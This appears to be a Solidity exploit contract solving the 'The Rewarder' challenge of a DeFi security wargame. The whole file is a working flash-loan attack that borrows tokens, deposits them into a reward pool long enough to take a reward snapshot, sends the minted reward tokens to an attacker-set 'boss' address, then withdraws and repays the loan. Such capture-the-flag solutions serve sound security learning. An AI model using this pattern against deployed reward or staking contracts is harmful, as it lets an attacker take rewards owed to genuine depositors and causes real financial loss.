// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../the-rewarder/FlashLoanerPool.sol';
import '../the-rewarder/TheRewarderPool.sol';

contract RewarderAttack {

  FlashLoanerPool public f;
  TheRewarderPool public r;
  DamnValuableToken public t;
  RewardToken public rt;
  address payable public addressPool;
  address payable public addressFlash;
  address payable public boss;

  constructor(address payable _address1, address payable _address2, address payable _address3, address payable _address4, address payable _address5) {
    addressFlash = _address1;
    f = FlashLoanerPool(addressFlash);
    addressPool = _address2;
    r = TheRewarderPool(addressPool);
    t = DamnValuableToken(_address3);
    boss = _address5;
    rt = RewardToken(_address4);
  } 

  function attack(uint256 _amount) public {
    f.flashLoan(_amount);
    
  }

  function receiveFlashLoan(uint256 _amount) external{
    t.approve(addressPool, _amount);
    r.deposit(_amount);
    bool success = rt.transfer(boss, rt.balanceOf(address(this)));
    require(success, "final transfer failed");
    r.withdraw(_amount);
    t.transfer(addressFlash, _amount);
    
  }
}